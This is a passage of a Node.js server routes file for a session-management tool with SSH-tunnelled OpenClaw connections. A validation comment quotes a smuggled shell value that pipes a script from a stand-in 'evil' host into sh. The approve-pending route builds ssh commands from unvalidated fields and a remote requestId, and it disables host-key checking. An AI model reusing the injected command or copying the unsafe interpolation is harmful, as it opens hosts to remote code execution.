  if (result.error) {
    return errorResponse(res, 404, result.error, 'NOT_FOUND');
  }

  jsonResponse(res, 200, {
    lines: result.lines,
    project: params.project,
    tmuxSession: result.tmuxSession,
    alternateScreen: result.alternateScreen || false
  });
});

// GET /api/sessions/:project/history — Session history
route('GET', '/api/sessions/:project/history', (req, res, params) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);

  const result = sessions.getSessionHistory(params.project, {
    limit: query.limit ? parseInt(query.limit, 10) : 20,
    status: query.status || undefined
  });

  if (result.error) {
    return errorResponse(res, 404, result.error, 'NOT_FOUND');
  }

  jsonResponse(res, 200, {
    sessions: result.sessions,
    total: result.total
  });
});

// ── CC-5: operator-facing cross-session continuity search ──
// These read the per-project continuity store (changelog + wrap summaries +
// cold transcripts), distinct from /api/sessions/:project/history above, which
// reads the SQLite sessions table. The drawer (History) consumes these.

/**
 * Validate an untrusted continuity `:sid` route param. The `<sid>` store key is
 * an integer session id or a wrap-summary filename stem; restrict it to the safe
 * charset BEFORE it reaches `path.join` in the store helpers. `matchRoute`
 * decodeURIComponent's after the `[^/]+` match, so a percent-encoded `..%2F..`
 * would otherwise traverse out of the project's store root.
 * @param {string} sid - Decoded route parameter
 * @returns {boolean} True when safe to use as a store key
 */
function _isValidSid(sid) {
  return typeof sid === 'string' && /^[A-Za-z0-9_-]+$/.test(sid);
}

/**
 * Strip the cold-tier meta envelope to the fields the UI needs, dropping the
 * absolute `source` path (a local `~/.claude` leak). Secret VALUES are never in
 * the meta to begin with (CC-4b records pattern types only).
 * @param {object|null} meta - Parsed `transcript.meta.json`, or null
 * @returns {object|null} UI-safe subset, or null when meta is absent
 */
function _publicTranscriptMeta(meta) {
  if (!meta) return null;
  return {
    harness: meta.harness || null,
    capturedAt: meta.capturedAt || null,
    bytes: meta.bytes || 0,
    lineCount: meta.lineCount || 0,
    secretsFlagged: !!meta.secretsFlagged,
    secretTypes: Array.isArray(meta.secretTypes) ? meta.secretTypes : [],
    scanSkipped: !!meta.scanSkipped
  };
}

// GET /api/continuity/:project/search — global search across this project's
// session history. `scope=summaries` (default) searches the warm changelog +
// wrap summaries; `scope=transcripts` greps every captured transcript directly
// (the "search my old transcripts" path). Both honor the same five filters.
route('GET', '/api/continuity/:project/search', async (req, res, params) => {
  const project = projects.getProject(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const query = parseQuery(new URL(req.url, `http://${req.headers.host || 'localhost'}`).search);
  const opts = {
    dateFrom: query.dateFrom,
    dateTo: query.dateTo,
    type: query.type,
    tags: query.tags,
    refs: query.refs,
    file: query.file,
    section: query.section,
    limit: query.limit ? parseInt(query.limit, 10) : 0
  };
  const result = query.scope === 'transcripts'
    ? await continuity.searchProjectTranscripts(project.path, query.q || '', opts)
    : continuity.searchSessions(project.path, query.q || '', opts);
  jsonResponse(res, 200, result);
});

// GET /api/continuity/:project/sessions — list every session in the store
route('GET', '/api/continuity/:project/sessions', (req, res, params) => {
  const project = projects.getProject(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, { sessions: continuity.listSessions(project.path) });
});

// GET /api/continuity/:project/sessions/:sid — drill-down payload for one session
route('GET', '/api/continuity/:project/sessions/:sid', (req, res, params) => {
  const project = projects.getProject(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const sid = params.sid;
  if (!_isValidSid(sid)) {
    return errorResponse(res, 400, 'Invalid session id', 'BAD_REQUEST');
  }
  const session = continuity.listSessions(project.path).find((s) => s.sid === String(sid)) || null;
  jsonResponse(res, 200, {
    sid: String(sid),
    session,
    summary: continuity.readWrapSummary(project.path, sid),
    transcript: _publicTranscriptMeta(continuity.readTranscriptMeta(project.path, sid)),
    // listUploads tags each entry with `session` (the <sid> dir name), not `sid`.
    uploads: uploads.listUploads(project.path).filter((u) => String(u.session) === String(sid))
  });
});

// GET /api/continuity/:project/sessions/:sid/transcript/search — cold drill-down
route('GET', '/api/continuity/:project/sessions/:sid/transcript/search', async (req, res, params) => {
  const project = projects.getProject(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  if (!_isValidSid(params.sid)) {
    return errorResponse(res, 400, 'Invalid session id', 'BAD_REQUEST');
  }
  const query = parseQuery(new URL(req.url, `http://${req.headers.host || 'localhost'}`).search);
  const result = await continuity.searchTranscript(project.path, params.sid, query.q || '', {
    cap: query.cap ? parseInt(query.cap, 10) : undefined
  });
  jsonResponse(res, 200, result);
});

// GET /api/activity — Activity log query
route('GET', '/api/activity', (req, res) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);

  const options = {};
  if (query.project) {
    const project = store.projects.getByName(query.project);
    if (project) options.projectId = project.id;
  }
  if (query.type) options.eventType = query.type;
  if (query.limit) options.limit = parseInt(query.limit, 10);
  if (query.since) options.since = query.since;

  const entries = store.activity.query(options);

  // Enrich with project names
  const projectCache = new Map();
  const enriched = entries.map((entry) => {
    let projectName = null;
    if (entry.projectId) {
      if (!projectCache.has(entry.projectId)) {
        const p = store.projects.get(entry.projectId);
        projectCache.set(entry.projectId, p ? p.name : null);
      }
      projectName = projectCache.get(entry.projectId);
    }
    return {
      id: entry.id,
      projectId: entry.projectId,
      projectName,
      sessionId: entry.sessionId,
      eventType: entry.eventType,
      detail: entry.detail,
      createdAt: entry.createdAt
    };
  });

  jsonResponse(res, 200, { entries: enriched });
});

// POST /api/upload — Upload a file to a project's .uploads/ directory
route('POST', '/api/upload', (_req, res, _params, body) => {
  if (!body || !body.project || !body.filename || !body.data) {
    return errorResponse(res, 400, 'project, filename, and data are required', 'BAD_REQUEST');
  }

  const project = projects.getProject(body.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${body.project}" not found`, 'NOT_FOUND');
  }

  if (!fs.existsSync(project.path)) {
    return errorResponse(res, 400, 'Project directory not found on disk', 'BAD_REQUEST');
  }

  try {
    // Route the upload into the active session's slot in the consolidated
    // store (CC-4); no active session → uploads.saveUpload falls back to the
    // legacy flat dir. `getActive` returns null when nothing is running.
    const active = store.sessions.getActive(project.id);
    const sid = active && active.id != null ? active.id : null;
    const result = uploads.saveUpload(project.path, body.filename, body.data, sid);
    jsonResponse(res, 201, result);
  } catch (err) {
    // #338 — any file type is accepted, so there is no "not allowed" rejection
    // path any more; a throw here is a genuine save failure.
    log.error('Upload failed', { error: err.message });
    return errorResponse(res, 500, err.message, 'INTERNAL_ERROR');
  }
}, { maxBodySize: 15 * 1024 * 1024 });

// GET /api/uploads — List uploads for a project
route('GET', '/api/uploads', (req, res) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);

  if (!query.project) {
    return errorResponse(res, 400, 'project query parameter is required', 'BAD_REQUEST');
  }

  const project = projects.getProject(query.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${query.project}" not found`, 'NOT_FOUND');
  }

  const list = uploads.listUploads(project.path);
  jsonResponse(res, 200, { uploads: list });
});

// GET /api/tmux/mouse/:session
route('GET', '/api/tmux/mouse/:session', (_req, res, params) => {
  try {
    const tmuxName = tmux.toSessionName(params.session);
    const mouse = tmux.getMouse(tmuxName);
    jsonResponse(res, 200, { mouse, session: params.session });
  } catch (err) {
    return errorResponse(res, 404, err.message, 'NOT_FOUND');
  }
});

// ── Groups API ──

// GET /api/groups
route('GET', '/api/groups', (_req, res) => {
  const groups = store.projectGroups.list();
  // Enrich with member count and doc count
  const enriched = groups.map(g => {
    const members = store.projectGroups.listMembers(g.id);
    const docs = store.sharedDocs.getByGroup(g.id);
    return { ...g, memberCount: members.length, docCount: docs.length };
  });
  jsonResponse(res, 200, { groups: enriched });
});

// POST /api/groups
route('POST', '/api/groups', (_req, res, _params, body) => {
  if (!body || !body.name) {
    return errorResponse(res, 400, 'name is required', 'BAD_REQUEST');
  }
  try {
    const group = store.projectGroups.create(body);
    jsonResponse(res, 201, group);
  } catch (err) {
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    throw err;
  }
});

// GET /api/groups/:id
route('GET', '/api/groups/:id', (_req, res, params) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  const memberIds = store.projectGroups.listMembers(group.id);
  const members = memberIds.map(pid => {
    const proj = store.projects.get(pid);
    return proj ? { id: pid, name: proj.name, path: proj.path } : { id: pid, name: null, path: null };
  });
  const docs = store.sharedDocs.getByGroup(group.id);
  jsonResponse(res, 200, { ...group, memberCount: members.length, docCount: docs.length, members, docs });
});

// PUT /api/groups/:id
route('PUT', '/api/groups/:id', (_req, res, params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  try {
    const group = store.projectGroups.update(params.id, body);
    jsonResponse(res, 200, group);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    throw err;
  }
});

// DELETE /api/groups/:id
route('DELETE', '/api/groups/:id', (_req, res, params) => {
  try {
    store.projectGroups.delete(params.id);
    jsonResponse(res, 200, { ok: true, id: params.id });
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    throw err;
  }
});

// POST /api/groups/:id/sync — Sync shared docs from group's sharedDir
route('POST', '/api/groups/:id/sync', (_req, res, params) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  if (!group.sharedDir) {
    return errorResponse(res, 400, 'Group has no sharedDir configured', 'BAD_REQUEST');
  }
  const result = store.sharedDocs.syncFromDirectory(params.id, group.sharedDir);
  jsonResponse(res, 200, { ok: true, ...result });
});

// ── Group Members API ──

// GET /api/groups/:id/members
route('GET', '/api/groups/:id/members', (_req, res, params) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  const memberIds = store.projectGroups.listMembers(params.id);
  // Enrich with project names
  const members = memberIds.map(pid => {
    const proj = store.projects.get(pid);
    return proj ? { id: pid, name: proj.name, path: proj.path } : { id: pid, name: null, path: null };
  });
  jsonResponse(res, 200, { members });
});

// POST /api/groups/:id/members
route('POST', '/api/groups/:id/members', (_req, res, params, body) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  if (!body || !body.projectId) {
    return errorResponse(res, 400, 'projectId is required', 'BAD_REQUEST');
  }
  const project = store.projects.get(body.projectId);
  if (!project) {
    return errorResponse(res, 404, `Project "${body.projectId}" not found`, 'NOT_FOUND');
  }
  store.projectGroups.addMember(params.id, body.projectId);
  jsonResponse(res, 200, { ok: true, groupId: params.id, projectId: body.projectId });
});

// DELETE /api/groups/:id/members/:projectId
route('DELETE', '/api/groups/:id/members/:projectId', (_req, res, params) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  store.projectGroups.removeMember(params.id, parseInt(params.projectId, 10));
  jsonResponse(res, 200, { ok: true, groupId: params.id, projectId: parseInt(params.projectId, 10) });
});

// ── Shared Documents API ──

// GET /api/shared-docs
route('GET', '/api/shared-docs', (req, res) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);
  const options = {};
  if (query.groupId) options.groupId = query.groupId;
  const docs = store.sharedDocs.list(options);
  jsonResponse(res, 200, { docs });
});

// POST /api/shared-docs
route('POST', '/api/shared-docs', (_req, res, _params, body) => {
  if (!body || !body.groupId || !body.name || !body.filePath) {
    return errorResponse(res, 400, 'groupId, name, and filePath are required', 'BAD_REQUEST');
  }
  try {
    const doc = store.sharedDocs.create(body);
    jsonResponse(res, 201, doc);
  } catch (err) {
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
});

// GET /api/shared-docs/:id
route('GET', '/api/shared-docs/:id', (_req, res, params) => {
  const doc = store.sharedDocs.get(params.id);
  if (!doc) {
    return errorResponse(res, 404, `Shared document "${params.id}" not found`, 'NOT_FOUND');
  }
  // Include lock status
  const lock = store.documentLocks.check(doc.id);
  jsonResponse(res, 200, { ...doc, lock: lock || null });
});

// PUT /api/shared-docs/:id
route('PUT', '/api/shared-docs/:id', (_req, res, params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  try {
    const doc = store.sharedDocs.update(params.id, body);
    jsonResponse(res, 200, doc);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
});

// DELETE /api/shared-docs/:id
route('DELETE', '/api/shared-docs/:id', (_req, res, params) => {
  try {
    store.sharedDocs.delete(params.id);
    jsonResponse(res, 200, { ok: true, id: params.id });
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    throw err;
  }
});

// ── Document Locks API ──

// POST /api/shared-docs/:id/lock
route('POST', '/api/shared-docs/:id/lock', (_req, res, params, body) => {
  if (!body || !body.sessionId || !body.projectName) {
    return errorResponse(res, 400, 'sessionId and projectName are required', 'BAD_REQUEST');
  }
  try {
    const lock = store.documentLocks.acquire(params.id, body.sessionId, body.projectName, body.ttlMinutes);
    jsonResponse(res, 200, lock);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'LOCK_CONFLICT') {
      return errorResponse(res, 409, err.message, 'LOCK_CONFLICT');
    }
    throw err;
  }
});

// GET /api/shared-docs/:id/lock
route('GET', '/api/shared-docs/:id/lock', (_req, res, params) => {
  const doc = store.sharedDocs.get(params.id);
  if (!doc) {
    return errorResponse(res, 404, `Shared document "${params.id}" not found`, 'NOT_FOUND');
  }
  const lock = store.documentLocks.check(params.id);
  jsonResponse(res, 200, { locked: !!lock, lock: lock || null });
});

// DELETE /api/shared-docs/:id/lock
route('DELETE', '/api/shared-docs/:id/lock', (_req, res, params) => {
  const doc = store.sharedDocs.get(params.id);
  if (!doc) {
    return errorResponse(res, 404, `Shared document "${params.id}" not found`, 'NOT_FOUND');
  }
  store.documentLocks.release(params.id);
  jsonResponse(res, 200, { ok: true, id: params.id });
});

// ── OpenClaw Connections API ──

// GET /api/openclaw/connections
route('GET', '/api/openclaw/connections', (_req, res) => {
  const connections = store.openclawConnections.list();
  jsonResponse(res, 200, { connections });
});

// POST /api/openclaw/connections
route('POST', '/api/openclaw/connections', (_req, res, _params, body) => {
  if (!body || !body.name || !body.host || !body.sshUser || !body.sshKeyPath) {
    return errorResponse(res, 400, 'name, host, sshUser, and sshKeyPath are required', 'BAD_REQUEST');
  }
  // Resolve the tunnel local_port. An explicit port is conflict-checked and
  // used verbatim; when omitted, PortHub auto-allocates the first free port so
  // a second connection can't silently collide on the legacy 18789 default (#352).
  if (body.localPort) {
    const portCheck = porthub.checkPort(body.localPort);
    if (!portCheck.available) {
      return errorResponse(res, 409, `Port ${body.localPort} is already in use by ${portCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
    }
  } else {
    try {
      body.localPort = porthub.nextFreePort({ range: [18789, 18999] });
    } catch (err) {
      return errorResponse(res, 409, err.message, 'PORT_EXHAUSTED');
    }
  }
  // Resolve bridge_port. NULL-by-default is load-bearing: a non-null bridge_port
  // emits an extra `-L` SSH forward that breaks non-ClawBridge tunnels (#160), so
  // we only auto-allocate when the caller explicitly opts in with the 'auto'
  // sentinel. An explicit number is conflict-checked; anything else stays null.
  if (body.bridgePort === 'auto') {
    try {
      body.bridgePort = porthub.nextFreePort({ range: [3201, 3300] });
    } catch (err) {
      return errorResponse(res, 409, err.message, 'PORT_EXHAUSTED');
    }
  } else if (body.bridgePort !== undefined && body.bridgePort !== null && body.bridgePort !== '') {
    const bridgeCheck = porthub.checkPort(body.bridgePort);
    if (!bridgeCheck.available) {
      return errorResponse(res, 409, `Bridge port ${body.bridgePort} is already in use by ${bridgeCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
    }
  }
  try {
    const connection = store.openclawConnections.create(body);
    // Lease-at-create: reserve the resolved port(s) under the connection's tunnel
    // identity so a subsequent add picks a different port even before the tunnel
    // comes up (closing the allocate→bind race). Released on DELETE.
    const leaseName = `oc-direct-${connection.id}`;
    porthub.registerPort(connection.localPort, leaseName, 'openclaw-tunnel', { permanent: true });
    if (connection.bridgePort) {
      porthub.registerPort(connection.bridgePort, leaseName, 'openclaw-bridge', { permanent: true });
    }
    jsonResponse(res, 201, connection);
  } catch (err) {
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
});

// GET /api/openclaw/connections/:id
route('GET', '/api/openclaw/connections/:id', (_req, res, params) => {
  const connection = store.openclawConnections.get(params.id);
  if (!connection) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, connection);
});

// GET /api/openclaw/connections/:id/version — OpenClaw instance version (#296).
// Reads the pinned image tag from the instance's .env over SSH (cached). Needs
// the connection's `instanceDir` set; returns version:null + a reason otherwise.
route('GET', '/api/openclaw/connections/:id/version', (req, res, params) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }
  const force = /[?&]force=(1|true)\b/.test(req.url || '');
  const result = openclawVersion.fetchVersion(conn, { force });
  jsonResponse(res, 200, { version: result.version, cached: !!result.cached, error: result.error });
});

// POST /api/openclaw/detect-instance-dir — auto-discover candidate instanceDir
// values over SSH (#306-followup). Stateless: takes the SSH-target fields in
// the body so it works from the Add form before the connection exists.
route('POST', '/api/openclaw/detect-instance-dir', (_req, res, _params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  const { host, sshUser, sshKeyPath } = body;
  const result = openclawDetect.detectInstanceDir({ host, sshUser, sshKeyPath });
  jsonResponse(res, 200, { dirs: result.dirs, error: result.error });
});

// PUT /api/openclaw/connections/:id
route('PUT', '/api/openclaw/connections/:id', (_req, res, params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  // Check for port conflicts if localPort is being changed
  if (body.localPort !== undefined) {
    const existing = store.openclawConnections.get(params.id);
    if (existing && body.localPort !== existing.localPort) {
      const portCheck = porthub.checkPort(body.localPort);
      if (!portCheck.available) {
        return errorResponse(res, 409, `Port ${body.localPort} is already in use by ${portCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
      }
    }
  }
  try {
    const connection = store.openclawConnections.update(params.id, body);
    openclawVersion.invalidate(params.id); // #296: instanceDir may have changed → drop stale cache
    jsonResponse(res, 200, connection);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
});

// DELETE /api/openclaw/connections/:id
route('DELETE', '/api/openclaw/connections/:id', (_req, res, params) => {
  try {
    // Kill any active standalone tunnel and release port before deleting
    const conn = store.openclawConnections.get(params.id);
    if (conn) {
      tunnel.killTunnel(`oc-direct-${conn.id}`);
      if (conn.localPort) {
        porthub.releasePort(conn.localPort);
      }
      if (conn.bridgePort) {
        porthub.releasePort(conn.bridgePort);
      }
    }
    store.openclawConnections.delete(params.id);
    openclawVersion.invalidate(params.id); // #296: drop any cached version for the deleted connection
    jsonResponse(res, 200, { ok: true, id: params.id });
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    throw err;
  }
});

// POST /api/openclaw/test — Test SSH connectivity + gateway health
route('POST', '/api/openclaw/test', (_req, res, _params, body) => {
  if (!body || !body.host || !body.sshUser || !body.sshKeyPath) {
    return errorResponse(res, 400, 'host, sshUser, and sshKeyPath are required', 'BAD_REQUEST');
  }
  // #312: these fields are interpolated into an `ssh ...` shell command below,
  // so shape-validate them (reusing the detect endpoint's guards — one source
  // of truth) before any shell-out. Rejects `;`, `$(...)`, backticks, etc.
  const unsafe = openclawDetect.unsafeReason({
    host: body.host,
    sshUser: body.sshUser,
    sshKeyPath: body.sshKeyPath
  });
  if (unsafe) {
    return errorResponse(res, 400, unsafe, 'BAD_REQUEST');
  }
  // #312: `port`/`localPort` are interpolated into the `curl …:<port>/healthz`
  // shell command below, so they must be plain integers in range — reject
  // anything else (e.g. `localPort = "1;curl evil|sh"`) before shelling out.
  for (const [name, val] of [['port', body.port], ['localPort', body.localPort]]) {
    if (val === undefined || val === null || val === '') continue;
    const n = Number(val);
    if (!Number.isInteger(n) || n < 1 || n > 65535) {
      return errorResponse(res, 400, `${name} must be an integer between 1 and 65535`, 'BAD_REQUEST');
    }
  }

  const keyPath = body.sshKeyPath.replace(/^~/, process.env.HOME || '');
  const port = body.port || 18789;
  const host = body.host;
  const sshUser = body.sshUser;

  // Test SSH connectivity with a short timeout
  const { execSync } = require('node:child_process');
  const results = { ssh: false, gateway: false, errors: [] };

  try {
    execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=accept-new -i "${keyPath}" ${sshUser}@${host} "echo ok"`,
      { timeout: 10000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    );
    results.ssh = true;
  } catch (err) {
    results.errors.push(`SSH: ${err.stderr || err.message}`);
  }

  // Test gateway health if a localPort or port is provided
  if (body.localPort || port) {
    const testPort = body.localPort || port;
    try {
      const output = execSync(
        `curl -s -m 5 http://localhost:${testPort}/healthz`,
        { timeout: 10000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
      );
      try {
        const parsed = JSON.parse(output);
        results.gateway = !!parsed.ok;
      } catch {
        results.gateway = false;
        results.errors.push(`Gateway: unexpected response: ${output.slice(0, 200)}`);
      }
    } catch (err) {
      results.errors.push(`Gateway: ${err.stderr || err.message}`);
    }
  }

  jsonResponse(res, 200, results);
});

// POST /api/openclaw/connections/:id/tunnel — Start tunnel for standalone access
route('POST', '/api/openclaw/connections/:id/tunnel', async (_req, res, params, body) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }

  const extraForwards = conn.bridgePort ? [{ localPort: conn.bridgePort, remotePort: conn.bridgePort }] : [];
  const tunnelResult = await tunnel.ensureTunnel(`oc-direct-${conn.id}`, {
    host: conn.host,
    port: conn.port,
    localPort: conn.localPort,
    sshUser: conn.sshUser,
    sshKeyPath: conn.sshKeyPath,
    force: body && body.force === true,
    extraForwards
  });

  if (!tunnelResult.ok) {
    return errorResponse(res, 502, `Tunnel failed: ${tunnelResult.error}`, 'TUNNEL_ERROR');
  }

  const tokenParam = conn.gatewayToken ? `#token=${encodeURIComponent(conn.gatewayToken)}` : '';
  // Proxy through TangleClaw so remote browsers can reach the tunnel on the TangleClaw host
  const webuiUrl = `/openclaw-direct/${encodeURIComponent(conn.id)}/chat?session=main${tokenParam}`;

  jsonResponse(res, 200, {
    ok: true,
    alreadyUp: tunnelResult.alreadyUp,
    webuiUrl,
    localPort: conn.localPort
  });
});

// GET /api/openclaw/connections/:id/tunnel — Get tunnel status for a connection
route('GET', '/api/openclaw/connections/:id/tunnel', async (_req, res, params) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }

  const status = await tunnel.detectTunnel(conn.localPort, conn.host);
  const tracked = tunnel.getTunnel(`oc-direct-${conn.id}`);

  jsonResponse(res, 200, {
    localPort: conn.localPort,
    host: conn.host,
    active: status.active,
    connectable: status.connectable,
    pid: status.pid,
    tracked: !!tracked
  });
});

// DELETE /api/openclaw/connections/:id/tunnel — Kill tunnel for a connection
route('DELETE', '/api/openclaw/connections/:id/tunnel', async (_req, res, params) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }

  // Try tracked kill first, then fall back to port-based kill
  const tracked = tunnel.killTunnel(`oc-direct-${conn.id}`);
  const byPort = await tunnel.killTunnelByPort(conn.localPort, conn.host);

  // Also kill any project-scoped tunnels using this connection's port
  const projectTunnels = tunnel.listTunnels().filter(t => t.localPort === conn.localPort);
  for (const t of projectTunnels) {
    tunnel.killTunnel(t.projectName);
  }

  // Mark any active webui sessions using this connection as killed
  const connections = store.openclawConnections.list();
  const thisConn = connections.find(c => c.id === params.id);
  if (thisConn) {
    const projects = store.projects.list();
    for (const proj of projects) {
      if (proj.engineId === `openclaw:${params.id}`) {
        const active = store.sessions.getActive(proj.id);
        if (active && active.sessionMode === 'webui') {
          store.sessions.kill(active.id, 'Tunnel killed from connection panel');
        }
      }
    }
  }

  // #288: report whether the port was actually freed — the old route returned
  // ok:true unconditionally, hiding the exact zombie-survives-kill case this
  // fix exists to surface. `released:false` means the operator still has a
  // stuck tunnel and should escalate (manual kill), not assume recovery.
  jsonResponse(res, 200, {
    ok: byPort.released !== false,
    killedPid: byPort.pid,
    released: byPort.released,
    error: byPort.error || null,
    localPort: conn.localPort
  });
});

// POST /api/openclaw/connections/:id/approve-pending — Auto-approve pending device pairing
route('POST', '/api/openclaw/connections/:id/approve-pending', async (_req, res, params) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }

  if (!conn.gatewayToken) {
    return errorResponse(res, 400, 'No gateway token configured — cannot approve pairing', 'BAD_REQUEST');
  }

  const keyPath = conn.sshKeyPath.replace(/^~/, process.env.HOME || '');
  const { execSync } = require('node:child_process');

  // List pending devices via the gateway's WebSocket CLI.
  // Filter by published gateway port so we pick the right container on multi-tenant
  // hosts (e.g. habitat runs RentalClaw, UCI services, and TiLT Claw side-by-side).
  // Falls back to head -1 as a safety net if multiple containers somehow publish the
  // same port (shouldn't happen given PortHub registration).
  let pending;
  try {
    const listOutput = execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "${keyPath}" ${conn.sshUser}@${conn.host} ` +
      `"\\$HOME/.local/bin/docker ps --filter 'publish=${conn.port}' --format '{{.Names}}' | head -1"`,
      { timeout: 10000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    ).trim();

    if (!listOutput) {
      return jsonResponse(res, 200, { approved: false, reason: 'No Docker container found' });
    }

    const containerName = listOutput;
    const devicesJson = execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "${keyPath}" ${conn.sshUser}@${conn.host} ` +
      `"\\$HOME/.local/bin/docker exec ${containerName} openclaw devices list --json"`,
      { timeout: 15000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    ).trim();

    pending = JSON.parse(devicesJson).pending || [];
  } catch (err) {
    log.warn('Auto-approve: failed to list devices', { error: err.message });
    return jsonResponse(res, 200, { approved: false, reason: 'Failed to list pending devices' });
  }

  if (pending.length === 0) {
    return jsonResponse(res, 200, { approved: false, reason: 'No pending requests' });
  }

  // Approve the latest pending request — same publish-port filter as above.
  // `openclaw devices approve --latest` is a PREVIEW (returns which request
  // would be approved, doesn't approve); the actual approval requires the
  // requestId as a positional argument. Sort pending by `ts` desc and use
  // the most recent one's requestId.
  const latestPending = pending.slice().sort((a, b) => (b.ts || 0) - (a.ts || 0))[0];
  const requestId = latestPending && latestPending.requestId;
  if (!requestId) {
    return jsonResponse(res, 200, { approved: false, reason: 'Pending entry missing requestId' });
  }

  try {
    const containerName = execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "${keyPath}" ${conn.sshUser}@${conn.host} ` +
      `"\\$HOME/.local/bin/docker ps --filter 'publish=${conn.port}' --format '{{.Names}}' | head -1"`,
      { timeout: 10000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    ).trim();

    execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "${keyPath}" ${conn.sshUser}@${conn.host} ` +
      `"\\$HOME/.local/bin/docker exec ${containerName} openclaw devices approve ${requestId} --token ${conn.gatewayToken} --json"`,
      { timeout: 15000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    );

